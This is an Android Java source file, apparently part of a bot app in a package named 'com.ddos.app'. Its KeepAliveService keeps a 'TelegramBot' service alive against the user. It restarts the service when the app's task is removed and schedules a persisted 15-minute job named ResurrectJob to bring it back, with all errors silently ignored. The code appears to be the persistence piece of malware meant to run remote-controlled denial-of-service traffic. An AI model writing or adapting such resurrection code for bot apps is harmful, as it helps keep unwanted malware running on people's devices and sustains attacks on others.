package com.ddos.app;

import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

public class KeepAliveService extends Service {

    @Nullable @Override public IBinder onBind(Intent i) { return null; }

    @Override public int onStartCommand(Intent i, int f, int s) {
        scheduleJob();
        ensureBot();
        return START_STICKY;
    }

    private void ensureBot() {
        try {
            ContextCompat.startForegroundService(this, new Intent(this, TelegramBot.class));
        } catch (Exception ignored) {}
    }

    private void scheduleJob() {
        try {
            if (Build.VERSION.SDK_INT >= 21) {
                JobScheduler js = (JobScheduler)
                    getSystemService(Context.JOB_SCHEDULER_SERVICE);
                JobInfo j = new JobInfo.Builder(777,
                        new ComponentName(this, ResurrectJob.class))
                        .setPersisted(true)
                        .setPeriodic(15 * 60 * 1000)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .build();
                if (js != null) js.schedule(j);
            }
        } catch (Exception ignored) {}
    }

    @Override public void onTaskRemoved(Intent rootIntent) {
        Intent r = new Intent(getApplicationContext(), TelegramBot.class);
        if (Build.VERSION.SDK_INT >= 26)
            getApplicationContext().startForegroundService(r);
        else getApplicationContext().startService(r);
        super.onTaskRemoved(rootIntent);
    }

    public static class ResurrectJob extends JobService {
        @Override public boolean onStartJob(JobParameters p) {
            ContextCompat.startForegroundService(getApplicationContext(),
                new Intent(getApplicationContext(), TelegramBot.class));
            return false;
        }
        @Override public boolean onStopJob(JobParameters p) { return true; }
    }
}
